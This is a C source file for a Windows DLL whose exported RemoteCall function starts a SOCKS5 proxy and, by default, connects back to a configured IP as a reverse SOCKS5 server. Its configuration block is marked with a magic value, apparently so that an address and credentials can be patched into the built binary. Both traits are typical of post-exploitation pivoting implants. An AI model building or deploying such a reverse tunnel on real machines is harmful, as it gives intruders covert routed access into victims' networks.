#include "revsocksserver.h"
#include "revsocksl.h"
#include <stdio.h>

typedef struct _CONFIG {
    long long mv;
    int port;
    int revsock;
    char username[65];
    char password[65];
    char ip[16];
} CONFIG, *PCONFIG;
volatile CONFIG g_conf = {0xcafebabecafebabe, 0, 1};

extern __declspec(dllexport) void RemoteCall() {
    WSADATA wsaData;
    int iResult;
    
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        return;
    }
    
    RevSocks* rs = init_socks5_server(g_conf.username, g_conf.password, g_conf.port);
    rs->echo = 0;

    if (g_conf.revsock)
    {
        host_rev_socks5_server(rs, g_conf.ip, g_conf.port);
    }
    else {
        host_socks5_server(rs);
    }
}
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved)
{
    HANDLE hThread = 0;
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        
        break;

    case DLL_PROCESS_DETACH:

        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}